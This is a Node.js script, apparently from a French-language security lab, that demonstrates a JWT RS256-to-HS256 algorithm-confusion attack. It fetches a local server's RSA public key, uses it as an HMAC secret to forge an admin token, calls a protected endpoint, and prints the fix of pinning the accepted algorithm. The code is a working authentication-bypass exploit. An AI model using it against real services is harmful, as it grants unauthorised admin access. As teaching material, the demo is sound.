const crypto   = require('crypto');
const BASE_URL = 'http://localhost:3000';

function b64Encode(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}

function banner(title) {
  console.log('\n' + '─'.repeat(60));
  console.log(' ' + title);
  console.log('─'.repeat(60));
}

async function run() {
  banner('ATTAQUE 2 : Confusion RS256 → HS256');

  console.log('\n[1] Récupération de la clé publique RSA (GET /api/public-key)...');
  const keyRes = await fetch(`${BASE_URL}/api/public-key`);
  if (!keyRes.ok) {
    console.error('    Serveur inaccessible ou clés RSA non générées.');
    console.error('    → node generate-keys.js  puis  node server.js');
    process.exit(1);
  }
  const RSA_PUBLIC_KEY = await keyRes.text();
  console.log('    Clé publique récupérée :\n');
  console.log(RSA_PUBLIC_KEY);

  console.log('[2] Forge du token HS256 signé avec la clé publique comme secret HMAC...');

  const forgedHeader  = b64Encode({ alg: 'HS256', typ: 'JWT' });
  const forgedPayload = b64Encode({
    username: 'attacker',
    role:     'admin',
    iat:      Math.floor(Date.now() / 1000),
    note:     'token forgé par confusion RS256/HS256',
  });

  const signature = crypto
    .createHmac('sha256', RSA_PUBLIC_KEY)
    .update(`${forgedHeader}.${forgedPayload}`)
    .digest('base64url');

  const forgedToken = `${forgedHeader}.${forgedPayload}.${signature}`;

  console.log('\n    Payload forgé :', JSON.stringify({ username: 'attacker', role: 'admin', note: '...' }));
  console.log('    Secret HMAC utilisé : clé publique RSA (connue de tous)');
  console.log('    Token forgé :', forgedToken.substring(0, 80) + '...');

  console.log('\n[3] Accès à /api/secret-rs256 avec le token forgé...');
  const secretRes  = await fetch(`${BASE_URL}/api/secret-rs256`, {
    headers: { Authorization: `Bearer ${forgedToken}` },
  });
  const secretData = await secretRes.json();

  if (secretRes.ok) {
    console.log('\n✅ ATTAQUE RÉUSSIE — accès obtenu sans clé privée RSA !');
    console.log('   Réponse :', JSON.stringify(secretData, null, 2));
  } else {
    console.log('\n❌ Attaque échouée (serveur probablement durci).');
    console.log('   Réponse :', JSON.stringify(secretData));
  }

  banner('FIN DE L\'ATTAQUE 2');
  console.log('\nCorrection : forcer l\'algorithme attendu lors de la vérification.');
  console.log('Exemple Node.js :  jwt.verify(token, publicKey, { algorithms: ["RS256"] })\n');
}

run().catch(err => {
  console.error('\n[ERREUR] :', err.message);
  console.error('→ Assurez-vous que le serveur est lancé : node server.js\n');
  process.exit(1);
});
